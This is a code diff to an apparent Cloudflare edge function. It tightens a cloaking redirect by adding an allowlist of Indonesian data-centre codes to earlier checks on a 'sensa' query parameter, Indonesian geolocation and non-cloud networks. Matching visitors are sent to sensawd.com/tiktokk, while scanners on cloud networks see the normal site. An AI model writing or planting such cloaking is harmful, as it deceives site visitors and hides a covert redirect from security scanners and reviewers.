@@ -5,12 +5,15 @@ export async function onRequest(context) {
   const country = request.cf ? request.cf.country : 'Unknown';
   const asOrganization = request.cf ? request.cf.asOrganization : '';
   const targetKey = url.searchParams.get('target');
+  const colo = request.cf ? request.cf.colo : '';
   if (targetKey !== 'sensa') {
     return next();
   }
   if (country !== 'ID') {
     return next();
   }
+  const allowedColo = ['CGK', 'SUB', 'BTH', 'DPS'];
+  if (!allowedColo.includes(colo)) return next();
   const cloudProviders = ['amazon', 'google', 'digitalocean', 'microsoft', 'cloudflare', 'akamai', 'datacentre'];
   const isCloud = cloudProviders.some(provider => asOrganization.toLowerCase().includes(provider));
   if (isCloud) {
@@ -25,5 +28,4 @@ export async function onRequest(context) {
     return next();
   }
   return Response.redirect("https://sensawd.com/tiktokk", 302);
-
 }
